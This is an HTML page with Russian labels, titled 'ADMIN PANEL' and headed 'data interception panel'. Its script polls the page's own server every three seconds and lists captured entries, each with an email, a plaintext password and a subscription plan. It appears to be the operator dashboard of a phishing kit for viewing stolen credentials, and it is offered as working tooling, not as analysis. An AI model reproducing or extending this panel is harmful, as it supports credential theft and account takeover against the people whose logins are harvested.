<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ADMIN PANEL</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;700;800;900&display=swap');
        :root { --bg-color: #0b0d12; --panel-bg: rgba(22, 25, 33, 0.65); --accent: #00ff88; --text-main: #fff; --text-sub: #8a92a6; --glass-border: rgba(255, 255, 255, 0.08); }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Montserrat', sans-serif; background-color: var(--bg-color); background-image: radial-gradient(circle at 15% 50%, rgba(0, 255, 136, 0.08) 0%, transparent 50%); background-attachment: fixed; color: var(--text-main); min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 20px; }
        nav { width: 100%; max-width: 800px; display: flex; justify-content: center; align-items: center; background: var(--panel-bg); backdrop-filter: blur(16px); border: 1px solid var(--glass-border); padding: 15px 25px; border-radius: 20px; margin-bottom: 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .logo { font-size: 22px; font-weight: 900; letter-spacing: 1px; display: flex; align-items: center; gap: 8px; }
        .logo span { color: var(--accent); }
        .hacker-panel { width: 100%; max-width: 800px; background: var(--panel-bg); backdrop-filter: blur(16px); border: 1px solid var(--glass-border); border-radius: 24px; padding: 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .hacker-title { font-size: 24px; font-weight: 900; margin-bottom: 20px; color: var(--accent); }
        .log-container { background: rgba(0,0,0,0.4); border: 1px solid var(--glass-border); border-radius: 16px; padding: 20px; min-height: 300px; font-family: monospace; font-size: 15px; color: var(--text-main); }
        .log-entry { padding: 12px; border-bottom: 1px solid rgba(255,255,255,0.05); display: flex; flex-direction: column; gap: 5px; animation: slideIn 0.3s ease-out; }
        .log-entry:last-child { border-bottom: none; }
        .log-email { color: var(--accent); font-weight: bold; font-size: 16px; }
        .log-pass { color: #ff3b30; font-weight: bold; font-size: 16px; }
        .log-time { color: var(--text-sub); font-size: 12px; }
        @keyframes slideIn { from { opacity: 0; transform: translateX(-20px); } to { opacity: 1; transform: translateX(0); } }
    </style>
</head>
<body>
    <nav><div class="logo">🕵️ ROCKET<span>ADMIN</span></div></nav>
    <div class="hacker-panel">
        <div class="hacker-title">📡 Панель перехвата данных</div>
        <div class="log-container" id="log-container">
            <div style="color: #555; text-align: center; margin-top: 80px;">Ожидание данных...</div>
        </div>
    </div>
    <script>
        // Ссылка на этот же сервер
        const SERVER_URL = window.location.origin; 
        const logContainer = document.getElementById('log-container');

        async function loadLogsFromServer() {
            try {
                const res = await fetch(`${SERVER_URL}/api/logs`);
                const logs = await res.json();
                
                if (logs.length === 0) {
                    logContainer.innerHTML = '<div style="color: #555; text-align: center; margin-top: 80px;">Ожидание данных...</div>';
                    return;
                }

                logContainer.innerHTML = '';
                logs.reverse().forEach(log => {
                    const entry = document.createElement('div');
                    entry.className = 'log-entry';
                    entry.innerHTML = `
                        <div><span style="color: var(--text-sub);">Email:</span> <span class="log-email">${log.email}</span></div>
                        <div><span style="color: var(--text-sub);">Пароль:</span> <span class="log-pass">${log.password}</span></div>
                        <div style="font-size: 12px; color: var(--text-sub);">Тариф: ${log.plan} | ${log.time}</div>
                    `;
                    logContainer.appendChild(entry);
                });
            } catch (err) {
                logContainer.innerHTML = '<div style="color: #ff3b30; text-align: center; margin-top: 80px;">Сервер недоступен...</div>';
            }
        }

        loadLogsFromServer();
        setInterval(loadLogsFromServer, 3000);
    </script>
</body>
</html>
